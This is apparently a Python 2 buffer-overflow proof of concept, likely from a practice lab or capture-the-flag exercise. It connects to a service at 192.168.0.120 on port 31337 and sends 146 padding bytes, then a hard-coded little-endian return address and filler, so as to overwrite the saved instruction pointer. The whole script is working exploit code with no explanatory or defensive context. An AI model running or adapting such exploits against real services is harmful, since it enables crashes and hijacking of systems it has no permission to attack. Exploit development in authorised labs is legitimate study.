#!/usr/bin/env python2
import socket
RHOST = "192.168.0.120"
RPORT = 31337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST,RPORT))
buf =""
buf += "A"*146 + "\xc3\x14\x04\x08" + "C"*(1024-146-4)
buf += "\n"
s.send(buf)
s.close()
